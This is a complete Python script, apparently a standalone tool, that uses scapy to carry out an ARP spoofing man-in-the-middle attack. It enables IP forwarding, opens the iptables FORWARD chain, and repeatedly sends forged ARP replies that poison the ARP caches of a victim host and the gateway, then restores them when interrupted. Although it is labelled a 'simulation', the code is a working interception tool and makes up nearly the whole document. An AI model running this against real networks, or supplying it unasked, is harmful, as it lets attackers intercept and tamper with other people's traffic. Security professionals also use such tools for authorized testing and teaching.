#!/usr/bin/env python3

from scapy.all import ARP, Ether, sendp
import time
import subprocess
import sys
import argparse
import re

# ============================
#   MAC ADDRESS VALIDATION
# ============================

MAC_REGEX = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")

def validate_mac(label, mac):
    if not MAC_REGEX.match(mac):
        print(f"[-] Invalid {label} MAC address format: {mac}")
        print("[!] Expected format example: 00:11:22:33:44:55")
        sys.exit(1)

# ============================
#   ROUTING CONFIGURATION
# ============================

def setup_routing():
    """
    Enables Linux kernel IP forwarding and ensures the FORWARD chain
    allows packet transit. Prevents accidental DoS during MITM.
    """
    print("[*] Configuring Linux kernel network parameters...")
    try:
        # Enable IPv4 forwarding
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True
        )

        # Ensure iptables FORWARD chain is open
        subprocess.run(
            ["iptables", "-P", "FORWARD", "ACCEPT"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            text=True
        )

        print("[+] Network routing and packet forwarding: ENABLED")

    except subprocess.CalledProcessError as e:
        print("[-] Failed to configure kernel routing.")
        print(f"[!] Command: {' '.join(e.cmd)}")
        print(f"[!] Error : {e.stderr.strip() if e.stderr else 'No stderr output'}")
        print("[!] Hint : Run this script with sudo / root privileges.")
        sys.exit(1)

    except Exception as e:
        print(f"[-] Unexpected error while configuring routing: {e}")
        sys.exit(1)

# ============================
#   SPOOFING PACKET SENDER
# ============================

def send_spoof_packet(target_ip, target_mac, fake_ip, attacker_mac):
    """
    Constructs and sends a Layer 2 ARP Reply packet.
    Forces the target to map the 'fake_ip' to the 'attacker_mac'.
    """
    packet = Ether(dst=target_mac) / ARP(
        op=2,                # ARP Reply
        pdst=target_ip,      # Target IP to poison
        hwdst=target_mac,    # Target MAC
        psrc=fake_ip,        # IP we are impersonating
        hwsrc=attacker_mac   # Attacker MAC
    )
    sendp(packet, verbose=False)

# ============================
#   NETWORK RESTORATION
# ============================

def restore_network(victim_ip, victim_mac, router_ip, router_mac):
    """
    Restores legitimate ARP mappings on both victim and router.
    Implements the 'Leaving Quietly' protocol.
    """
    print("\n\n[*] Initiating 'Leaving Quietly' protocol...")
    print("[*] Re-establishing correct MAC/IP bindings in target caches...")

    router_fix = Ether(dst=router_mac) / ARP(
        op=2, pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=victim_mac
    )
    
    victim_fix = Ether(dst=victim_mac) / ARP(
        op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac
    )

    for _ in range(5):
        sendp(router_fix, verbose=False)
        sendp(victim_fix, verbose=False)
        time.sleep(0.1)
        
    print("[+] Network state restored successfully. Mitigation verified.")

# ============================
#   MAIN
# ============================

def main():
    parser = argparse.ArgumentParser(description="Advanced ARP Spoofing & MITM Simulation Tool")
    parser.add_argument("-v", "--victim-ip", required=True, help="IP address of the victim host")
    parser.add_argument("-vm", "--victim-mac", required=True, help="MAC address of the victim host")
    parser.add_argument("-r", "--router-ip", required=True, help="IP address of the network gateway")
    parser.add_argument("-rm", "--router-mac", required=True, help="MAC address of the network gateway")
    parser.add_argument("-am", "--attacker-mac", required=True, help="Attacker's physical MAC address")
    parser.add_argument("-i", "--interval", type=float, default=2.0, help="Poisoning interval in seconds (default: 2.0)")

    args = parser.parse_args()

    # Validate MAC addresses
    validate_mac("victim", args.victim_mac)
    validate_mac("router", args.router_mac)
    validate_mac("attacker", args.attacker_mac)

    # Enable routing
    setup_routing()

    print(f"\n[*] Target Acquired: {args.victim_ip} ({args.victim_mac})")
    print(f"[*] Gateway Acquired: {args.router_ip} ({args.router_mac})")
    print("[*] Injecting persistent ARP updates into the segment...")

    tx_count = 0
    try:
        while True:
            send_spoof_packet(args.victim_ip, args.victim_mac, args.router_ip, args.attacker_mac)
            send_spoof_packet(args.router_ip, args.router_mac, args.victim_ip, args.attacker_mac)
            
            tx_count += 2
            sys.stdout.write(f"\r[+] Poison packets broadcasted: {tx_count}")
            sys.stdout.flush()
            
            time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\n[!] Execution halted via user interrupt.")
        restore_network(args.victim_ip, args.victim_mac, args.router_ip, args.router_mac)
        print("[+] Session closed cleanly.")

if __name__ == "__main__":
    main()
